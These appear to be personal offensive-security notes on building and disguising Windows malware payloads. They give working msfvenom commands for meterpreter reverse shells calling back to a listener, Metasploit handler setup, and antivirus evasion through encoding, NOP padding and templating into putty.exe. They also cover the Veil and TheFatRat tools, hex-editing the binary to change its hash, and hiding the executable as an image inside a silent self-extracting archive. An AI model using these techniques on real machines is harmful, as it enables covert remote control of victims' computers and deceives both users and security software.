Creating payloads 

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.59.13 LPORT=5555 -f exe -o shell0.exe
    
        use exploit/multi/handler -> to listen for incoming connection
        set payload (the same one as used in msfveon windows/x64/meterpreter/reverse_tcp)
        set host and ports 
        run -> execute exe on windows

    virustotal -> see how many antiviruses would catch the payload

    to bypass some antiviruses use: 
        encoding, encoding iterations, add nops...
        for example: 
            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.59.13 LPORT=5555 -f exe -a x64  -e x64/zutto_dekiru -i 15 --platform windows -n 500 -o shell0.exe

        templateing (as putty)
            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.59.13 LPORT=5555 -x putty.exe -f exe -o Putty.exe


        changing formats
            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.59.13 LPORT=5555 -f python -o payload.py (should be FUD, the problem is running)

        best -> implement your own payloads in a unique way

    using Veil
        sudo apt install Veil
        run it -> will install deps (when running for the first time)

        its pretty easy to use, very similar to msfconsole 

        generates .bat files -> convert to exe using https://github.com/tokyoneon/B2E
        also generates msfconsole resource that can be loaded to mfsconsole using resource keyword


    using fatrat https://github.com/screetsec/TheFatRat
        follow github readme for setup and installation
        run sudo su before running it


    changing payloads
        changing binary file using hexeditor
            lets see the hash of the current binary
                md5sum shell0.exe 
                ea553eb6c1f326a53ebc45d94cd77784  shell0.exe

            lets change something... $ hexeditor shell0.exe

            new hash:
                md5sum shell0.exe   
                c02a544615de60a2ab817f286b23d170  shell0.exe

        to look like some different file (car image...)
            I need a car image and the payload (exe) file
            
            convert png to ico (on google)

            create SFX archive (zip) from .png and .exe 
            under advanced sfx options use:
                extract and update
                override all files
                add SFX icon
                unpack to temp folder 
                hide all 
                under run after extraction add .exe and .png file names (correctly!)
            (has .exe extention)
